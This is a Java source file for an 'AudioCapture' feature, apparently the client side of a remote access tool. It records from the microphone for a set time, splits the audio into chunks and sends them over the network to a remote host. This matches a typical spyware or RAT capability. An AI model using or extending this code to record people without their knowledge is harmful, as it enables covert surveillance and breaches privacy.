package Client.Features;

import Handler.Message;
import Handler.PacketHandler;
import Tools.Network.NetworkInterface;

import javax.sound.sampled.*;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.time.LocalTime;

import static Tools.Globals.RECORD_TIME;
import static Tools.Globals.Sleep;

public class AudioCapture extends Feature {

    private TargetDataLine line;
    private static final AudioFormat format = new AudioFormat(AudioFormat.Encoding.PCM_SIGNED, 44100, 16, 2, 4, 44100, false);
    private static final Line.Info info = new DataLine.Info(TargetDataLine.class, format);

    public AudioCapture(PacketHandler packetHandler) {
        super(packetHandler);
        try {
            line = (TargetDataLine) AudioSystem.getLine(info);
        } catch (LineUnavailableException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void stopFeature() {
        if (line != null) line.close();
        running = false;
    }

    @Override
    public void startFeature() {
        try {
            line.open(format);
            line.start();
            running = true;
            thread.execute(run());
        } catch (LineUnavailableException e) {
            e.printStackTrace();
        }
    }

    @Override
    protected Runnable run() {
        return () -> {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            final byte[] data = new byte[line.getBufferSize() / 5];
            try {
                line.open(format);
                line.start();
                if (line.getFormat().matches(format)) {
                    LocalTime time = LocalTime.now();
                    LocalTime targetTime = time.plusSeconds(RECORD_TIME / 1000);
                    do {
                        int bytesRead = line.read(data, 0, data.length);
                        bos.write(data, 0, bytesRead);
                        line.flush();
                    } while (LocalTime.now().getSecond() != targetTime.getSecond());
                    line.close();
                    bos.close();
                    byte[] refByte = bos.toByteArray();
                    byte[][] spliced = objectHandler.spliceArray(refByte, 5);
                    for (byte[] bytes : spliced) {
                        Message<byte[]> msg = () -> bytes;
                        byte[] dataMsg = objectHandler.writeModifiedArray(objectHandler.writeObjects(msg), NetworkInterface.CommandByte.AUDIOCAPTURE_BYTE);
                        packetHandler.send(dataMsg, dataMsg.length, packetHandler.getAddress(), packetHandler.getPort());
                        Sleep(500);
                    }
                    packetHandler.send(new byte[]{NetworkInterface.CommandByte.AUDIOCAPTURE_INFO_STOP}, 1, packetHandler.getAddress(), packetHandler.getPort());
                }
            } catch (IOException | LineUnavailableException e) {
                e.printStackTrace();
            }
        };
    }

    @Override
    public void disposeAll() {
        thread.shutdown();
        line.close();
    }
}
